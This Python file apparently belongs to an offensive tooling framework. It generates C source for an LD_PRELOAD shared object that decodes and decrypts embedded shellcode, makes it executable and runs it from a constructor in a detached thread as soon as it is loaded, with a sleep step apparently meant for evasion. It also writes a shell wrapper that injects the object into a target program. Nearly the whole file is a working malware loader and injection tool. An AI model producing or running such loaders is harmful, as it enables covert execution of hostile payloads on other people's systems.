#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""C source generator for LD_PRELOAD shared-object payload delivery."""

from __future__ import annotations

from lib.compile.linux_injection_common import LinuxInjectionBuilder


class LdPreloadBuilder(LinuxInjectionBuilder):
    def build_so_source(self, encoded_payload: str, key: bytes, iv=None) -> str:
        decrypt = self.decrypt_block(key, iv).strip()
        return f"""
{chr(10).join(self.headers())}
#include <pthread.h>
#include <dlfcn.h>

char* enc_payload = "{encoded_payload}";
static unsigned char *g_sc = NULL;
static size_t g_len = 0;

static int decode_payload(void)
{{
    int enc_len = (int)strlen(enc_payload);
    unsigned char *decoded = (unsigned char *)malloc((size_t)enc_len);
    if (!decoded) return -1;
    int payload_size = base64decode(decoded, enc_payload, enc_len);
    if (payload_size <= 0) {{
        free(decoded);
        return -1;
    }}
    unsigned char *shellcode_buf = (unsigned char *)mmap(
        NULL, (size_t)payload_size, PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (shellcode_buf == MAP_FAILED) {{
        free(decoded);
        return -1;
    }}
{decrypt}
    g_sc = shellcode_buf;
    g_len = (size_t)payload_size;
    free(decoded);
    return 0;
}}

static void *run_shellcode(void *arg)
{{
    (void)arg;
    if (!g_sc || !g_len) return NULL;
    if (mprotect(g_sc, g_len, PROT_READ | PROT_EXEC) != 0) return NULL;
    {self.sleep_block()}
    ((void (*)(void))g_sc)();
    return NULL;
}}

__attribute__((constructor)) static void preload_init(void)
{{
    pthread_t tid;
    if (decode_payload() != 0) return;
    pthread_create(&tid, NULL, run_shellcode, NULL);
    pthread_detach(tid);
}}
"""

    def build_wrapper_script(self, *, so_path: str, target_binary: str) -> str:
        return f"""#!/bin/sh
# LD_PRELOAD wrapper — use only on authorized systems
export LD_PRELOAD="{so_path}"
exec "{target_binary}" "$@"
"""
